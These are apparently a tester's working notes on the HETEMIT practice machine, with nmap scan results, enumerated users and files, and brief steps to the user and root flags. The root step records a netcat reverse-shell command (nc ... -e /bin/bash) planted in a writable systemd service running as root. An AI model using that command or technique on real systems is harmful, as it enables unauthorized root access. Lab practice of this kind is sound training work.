[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT


22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)


80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)


139/tcp   open  netbios-ssn Samba smbd 4


445/tcp   open  netbios-ssn Samba smbd 4


18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord


50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```


---
## Software Versions

```powershell

```


---
## Discovered Subdomains




---
## Discovered Credentials

User\cmeeks (Local User) 

cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash

Cmeeks          Disk      cmeeks Files

HETEMIT        Wk Sv PrQ Unx NT SNT Samba 4.11.2

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles

FTP anonymous login


ruby 2.6.3

/home/cmeeks/register_hetemit/config/master.key

/etc/samba/smb.conf

/var/lib/dnf/history.sqlite

/etc/postgresql-setup/upgrade/postgresql.conf
/usr/lib/tmpfiles.d/postgresql.conf

Version: psql (PostgreSQL) 10.14

---
## Steps to User.txt

Test port 50000 endpoints and get RCE [[Web Requests API]]

---
## Steps to root.txt

Linpeas shows write access to nano /etc/systemd/system/pythonapp.service

user : root
execute nc 192.168.45.248 80 -e /bin/bash

catch reverse shell with port 80 penelope


---

## User Flag

```

```

## Root Flag

```

```